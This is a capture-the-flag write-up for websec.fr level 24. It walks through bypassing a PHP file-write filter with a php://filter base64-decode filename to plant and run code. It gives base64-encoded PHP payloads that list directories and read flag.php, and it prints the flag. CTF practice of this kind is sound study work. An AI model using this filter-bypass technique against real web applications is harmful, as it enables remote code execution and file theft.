# Level 24

1. First, lets check what is written in http://websec.fr/level24/source.php
2. Then, we are able to find out : 
    ```
    if (isset($_GET['p']) && isset($_GET['filename']) ) {
        $filename = $_GET['filename'];
        if ($_GET['p'] === "edit") {
            $p = "edit";
            if (isset($_POST['data'])) {
                $data = $_POST['data'];
                if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
                    file_put_contents($_GET['filename'], $data);
                    die ('<meta http-equiv="refresh" content="0; url=.">');
                }
            } elseif (file_exists($_GET['filename'])){
                $data = file_get_contents($_GET['filename']);
            }
        }
    }
    ```
    As you can see, we can type anything we want in the data without any script. Here : 
    ```
    if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
                file_put_contents($_GET['filename'], $data);
                die ('<meta http-equiv="refresh" content="0; url=.">');
            }
    ```
    So, we have to find out if there is any possibility to run a script on it and grab the flag out.
3. Check the code here : 
    ```
    <?php } elseif ($p === "edit") {
        echo "<div class='panel panel-default'>";
        echo "<div class='panel-heading'><h3 class='panel-title''>";
        echo "File <mark>$filename</mark>'s content: <a type='button' class='close' href='.'><span>&times;</span></a></h3>";
        echo "</div>";
        echo "<div class='panel-body'>";
        echo "<form action='?p=edit&filename=$filename' method='post'>";
        echo "<input type='hidden' name='filename' value='$filename'>";
        echo "<textarea class='form-control' name='data' rows='6'>" . htmlentities($data) . "</textarea><br>";
        echo "<a type='button' class='btn btn-default' href='.'>Cancel</a> ";
        echo "<button type='submit' class='btn btn-default' value='Submit'>Save changes</button>";
        echo "</form>";
        echo "</div></div>";
    } ?>
    ```
    We are able to find that we can change the the filename, which are able to reach our goal. After finding methods for a long time, the classic php filter vulnerability can reach our goal without doubt.
4. Now, we know what to do and the mission now is to figure out a filename.
    ```
    php://filter/convert.base64-decode/resource=filename.php
    ```
    So, the script up there allows us to decode a base64 file and read it, which allows us to run the script encoded in the script.
5. Next, we have to think of a php script that can find where is the flag. 
    ```
    <?php echo var_dump(scandir('../..'));?>
    ```
    "scandir" means "dir" or "ls", and "var_dump" are able to dump all data in a file.
    Then, encode it to a base64 format.
    ```
    PD9waHAgZWNobyB2YXJfZHVtcChzY2FuZGlyKCcuLi8uLicpKTs/Pg==
    ```
5. After we send the data, look up the code here : 
    ```
    $upload_dir = sprintf("./uploads/%s/", session_id());
    ```
    So, we are able to know where the website upload the file. Then, we can reach there to get our data : 
    ```
    http://websec.fr/level24/uploads/phpsessid/filename
    ```
    Now, we know that the name of the flag is "flag.php"
6. The final step, we have to write script that can read "flag.php".
    ```
    <?php echo file_get_contents('../../flag.php'));?>
    ```
    Base64 format : 
    ```
    PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnLi4vLi4vZmxhZy5waHAnKSk7Pz4=
    ```
    Then do exactly what we do before, and we can get the flag ~~~
7. Here is the flag : WEBSEC{no_javascript_no_php_I_guess_you_used_COBOL_to_get_a_RCE_right?}
